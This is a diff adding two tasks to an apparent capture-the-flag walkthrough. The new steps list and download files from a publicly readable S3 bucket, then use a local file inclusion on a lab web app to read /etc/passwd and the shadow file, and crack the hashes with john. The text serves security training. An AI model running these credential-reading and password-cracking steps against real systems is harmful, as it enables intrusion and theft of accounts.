@@ -855,3 +855,136 @@ Attack a web application
         * In the filename box search for c:\windows\system32
         * Search for cmd.exe, right click and choose open
         * You now have a privileged shell
+
+# Task 19
+AWS S3 information disclosure
+
+* Check S3 bucket for access
+```
+curl http://advent-bucket-one.s3.amazonaws.com/
+
+<?xml version="1.0" encoding="UTF-8"?>
+<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>advent-bucket-one</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>employee_names.txt</Key><LastModified>2019-12-14T15:53:25.000Z</LastModified><ETag>&quot;e8d2d18588378e0ee0b27fa1b125ad58&quot;</ETag><Size>7</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>test.txt</Key><LastModified>2020-12-02T12:58:09.000Z</LastModified><ETag>&quot;098f6bcd4621d373cade4e832627b4f6&quot;</ETag><Size>4</Size><Owner><ID>65a011a29cdf8ec533ec3d1ccaae921c</ID></Owner><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
+```
+
+* Attempt to connect to S3 bucket and perform ls
+```
+aws s3 ls s3://advent-bucket-one
+2019-12-14 10:53:25          7 employee_names.txt
+2020-12-02 07:58:09          4 test.txt
+```
+
+* Grab files
+```
+aws s3 cp s3://advent-bucket-one/test.txt test.txt
+download: s3://advent-bucket-one/test.txt to ./test.txt 
+
+aws s3 cp s3://advent-bucket-one/employee_names.txt n.txt
+download: s3://advent-bucket-one/employee_names.txt to ./n.txt
+```
+
+* Access files for sensitive information
+```
+cat test.txt
+cat n.txt
+```
+
+# Task 20
+LFI
+
+* Enumerate - nmap
+    ```
+    nmap -A -T4 10.10.120.158 | tee nmap.txt
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 19:45 EST
+    Nmap scan report for 10.10.120.158
+    Host is up (0.22s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 ef:22:7c:d2:0c:31:8c:27:e6:b9:27:b4:db:9f:d0:b1 (RSA)
+    |   256 08:48:b0:c5:cc:eb:dc:2a:78:28:f6:8b:77:dd:f9:da (ECDSA)
+    |_  256 1e:c0:87:49:4e:ce:c3:bf:c8:a7:7a:50:ee:d4:6d:7e (ED25519)
+    80/tcp open  http    Node.js (Express middleware)
+    |_http-title: Public Notes
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 34.81 seconds
+    ```
+* Enumerate - web site
+    * Reviewed website
+    * Looked at source
+    * Found this function
+        ```
+        <script>
+        function getNote(note, id) {
+            const url = '/get-file/' + note.replace(/\//g, '%2f')
+            $.getJSON(url,  function(data) {
+            document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
+            })
+        }
+        // getNote('server.js', '#note-1')
+        getNote('views/notes/note1.txt', '#note-1')
+        getNote('views/notes/note2.txt', '#note-2')
+        getNote('views/notes/note3.txt', '#note-3')
+        </script>        
+        ```
+    * Played around with various LFI techniques until we found one that worked
+        ```
+        curl http://10.10.120.158/get-file/%2Fetc%2Fpasswd
+        {"success":true,"info":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\n_apt:x:105:65534::/nonexistent:/bin/false\nlxd:x:106:65534::/var/lib/lxd/:/bin/false\nmessagebus:x:107:111::/var/run/dbus:/bin/false\nuuidd:x:108:112::/run/uuidd:/bin/false\ndnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false\nsshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin\npollinate:x:111:1::/var/cache/pollinate:/bin/false\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\ncharlie:x:1001:1001:Charlie the Elf,,,:/home/charlie:/bin/bash\n"}        
+        ```
+    * Format output
+        ```
+        curl -s http://10.10.120.158/get-file/%2Fetc%2Fpasswd | sed 's/\\n/\n/g' | sed 's/"info":"/\n/g' | sed -n -e '2,$p' | sed '$d' 
+                                                                        │                   │                           │           │
+        replace "\n" with a real \n ────────────────────────────────────┘                   │                           │           │
+        split header from first line in passwd file ────────────────────────────────────────┘                           │           │
+        print from line 2 to the end ───────────────────────────────────────────────────────────────────────────────────┘           │
+        print all except the last line ─────────────────────────────────────────────────────────────────────────────────────────────┘
+                                                                        
+        root:x:0:0:root:/root:/bin/bash                                                                                                
+        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                
+        bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                           
+        sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                           
+        sync:x:4:65534:sync:/bin:/bin/sync                                                                                             
+        games:x:5:60:games:/usr/games:/usr/sbin/nologin                                          
+        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                          
+        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                             
+        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                              
+        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                        
+        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                      
+        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                               
+        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                     
+        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                     
+        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                            
+        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                   
+        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin        
+        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                         
+        systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false       
+        systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false    
+        systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false            
+        systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false                 
+        syslog:x:104:108::/home/syslog:/bin/false                                          
+        _apt:x:105:65534::/nonexistent:/bin/false                                          
+        lxd:x:106:65534::/var/lib/lxd/:/bin/false                                          
+        messagebus:x:107:111::/var/run/dbus:/bin/false
+        uuidd:x:108:112::/run/uuidd:/bin/false
+        dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+        sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+        pollinate:x:111:1::/var/cache/pollinate:/bin/false
+        ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
+        charlie:x:1001:1001:Charlie the Elf,,,:/home/charlie:/bin/bash
+        ```
+    * Use similar to grab the shadow file
+
+* Crack SSH password with john
+    * Using passwd and shadow file from above
+        ```
+        unshadow passwd shadow > unshadow.txt
+        ```
+    * Crack using john
+        ```
+        john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
+        ```
